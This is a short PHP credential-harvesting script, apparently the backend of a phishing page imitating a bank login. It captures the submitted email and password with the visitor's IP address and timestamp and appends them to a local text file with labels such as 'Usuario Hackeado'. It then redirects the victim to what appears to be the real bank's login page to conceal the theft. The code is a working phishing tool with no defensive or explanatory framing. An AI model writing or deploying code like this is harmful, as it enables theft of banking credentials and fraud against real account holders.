<?php
//jaja todo esto es genial
$usuario = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$fecha = date("Y-m-d;h:i:s");


if( (empty($usuario)) or (empty($password)) ){
     header('location: index.html');
}else{

     //Guardara en un archivo de texto con las credenciales
$file = fopen('Contrasenas.txt','a+'); 
fwrite($file, "\r\nUsuario Hackeado: ".$usuario."\r\nContrase�a : ".$password."\r\nIP del usuario: ".$ip."\r\nFecha del Hack: ".$fecha."\r\n<--------XX-------->\r\n");
fclose($file);

header("Location: https://ebisaplus.bisa.com/BISA.UI/?version=6.6.1.16.2#/administrationGeneral/login");
}
?>


